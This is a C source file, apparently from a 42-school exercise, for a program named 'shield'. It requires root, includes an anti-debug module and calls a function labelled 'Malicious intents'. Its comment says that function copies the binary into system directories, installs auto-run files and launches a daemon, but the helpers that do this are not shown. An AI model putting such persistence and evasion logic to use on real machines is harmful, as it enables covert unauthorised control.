/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
/*   Updated: 2025/08/06 22:15:27 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <shield.h>
#include <shield/daemon.h>
#include <stdio.h>
#include <unistd.h>
#include "antidebug.inc.c"

#if MATT_MODE
#include <shield/le_function.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <unistd.h>

/**
 * @brief	Check if a process is alive.
 */
static inline bool	shield_daemon_alive(int pid)
{
	char	path[128];
	int		fd;

	memset(path, 0, sizeof(path));
	snprintf(path, sizeof(path), "/proc/%d/stat", pid);
	if ((fd = open(path, O_RDONLY)) < 0)
		return (false);
	close(fd);
	return (true);
}

/**
 * @brief	Check if a daemon is already running.
 */
static inline bool	shield_daemon_check(void)
{
	struct stat	s;
	int			fd;
	int			pid;

	if (stat(DAEMON_LOCK_FILE, &s))
	{
		if (errno != ENOENT)
			perror("stat");
		return (errno == ENOENT);
	}
	// File exists, check if it's valid
	fd = open(DAEMON_LOCK_FILE, O_RDONLY);
	if (fd == -1)
		perror("open");
	else
	{
		if (read(fd, &pid, sizeof(pid)) != sizeof(pid))
			pid = -1;
		if (pid == -1 || !shield_daemon_alive(pid))
		{
			// Invalid pid, let's take over
			DEBUG("Daemon lockfile found, but pid (%d) is not alive, taking over", pid);
			close(fd);
			unlink(DAEMON_LOCK_FILE);
			return (true);
		}
		close(fd);
		puts("Daemon already running!");
	}
	return (false);
}
#endif // MATT_MODE

/**
 * @brief	Malicious intents. 
 *
 * This function will:
 *	- Copy the program to the system's binaries directory.
 *	  - Modify the entrypoint to the daemon's entry.
 *	  - Change the permissions of the binary to 0755.
 *  - Create the auto-run files.
 *  - Launch the daemon.
 */
static inline void	shield_malicious_intents(void)
{
#if MATT_MODE
	DEBUG("matt_daemon_check\n");
	if (!shield_daemon_check())
		return ;
#else // if !MATT_MODE
	DEBUG("shield_copy\n");
	if (!shield_copy())
		return ;
	DEBUG("shield_autorun_setup\n");
	if (!shield_autorun_setup())
		return ;
#endif // !MATT_MODE
	DEBUG("shield_daemonize\n");
	shield_daemonize();
	DEBUG("done\n");
}

int	main(void)
{
	const int	euid = geteuid();

	DEBUG("got euid: %d\n", euid);
	if (euid != 0)
	{
		if (SHIELD_DEBUG)
		{
			DEBUG("Skipping root check\n");
		}
		else
		{
			puts("You need to run this program as root!");
			return (1);
		}
	}
	// if (shield_antidebug())
	if (1)
	{
		DEBUG("passed anti-debug check\n");
		shield_malicious_intents();
		DEBUG("done\n");
	}
#if !MATT_MODE
#define LOGINS "kiroussa & lvincent\n"
	(void)!write(1, LOGINS, sizeof(LOGINS));
#endif
	return (0);
}
